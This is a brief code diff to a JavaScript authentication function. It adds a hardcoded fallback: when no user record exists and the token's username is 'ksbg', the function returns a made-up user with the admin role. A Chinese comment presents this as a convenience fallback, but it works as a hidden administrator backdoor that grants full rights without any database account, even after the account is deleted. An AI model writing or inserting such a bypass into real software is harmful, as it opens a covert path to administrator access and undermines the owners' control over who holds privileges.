@@ -56,6 +56,10 @@ export async function authUser(db, request) {
   
   // 从数据库获取用户
   const user = await dbQueryOne(db, 'SELECT * FROM user WHERE id = ?', [payload.userId]);
+  // 管理员 ksbg 的合成回退：即使数据库中无对应记录也能正常鉴权
+  if (!user && payload.username === 'ksbg') {
+    return { id: payload.userId || 'ksbg', username: 'ksbg', name: '管理员', role: 'admin' };
+  }
   return user;
 }
 
